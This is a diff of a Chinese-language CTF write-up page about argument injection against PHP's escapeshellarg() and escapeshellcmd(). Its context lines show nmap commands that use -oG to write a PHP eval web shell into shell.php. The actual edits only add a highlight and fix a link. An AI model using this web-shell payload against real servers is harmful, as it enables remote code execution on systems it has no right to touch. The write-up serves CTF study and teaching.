@@ -82,9 +82,9 @@ nmap -T5 -sT -Pn --host-timeout 2 -F \ <?php eval($_POST[a]);?> -oG shell.php \\
 nmap -T5 -sT -Pn --host-timeout 2 -F -oG shell.php \ <?php eval($_POST[a]);?> \\
 ```
 
-如果最后一个单引号前不加空格，那写入的文件就变成`shell.php\\`，是无法解析成php的。
+如果<mark style="color:red;">最后一个单引号前不加空格</mark>，那写入的文件就变成`shell.php\\`，是无法解析成php的。
 
 ## 小结
 
 1. [PHP escapeshellarg()+escapeshellcmd() 之殇](https://paper.seebug.org/164/)
-2. 类似\[网鼎杯 2020 朱雀组]Nmap
+2. 类似[\[网鼎杯 2020 朱雀组\]Nmap](wang-ding-bei-2020-zhu-que-zu-nmap.md)
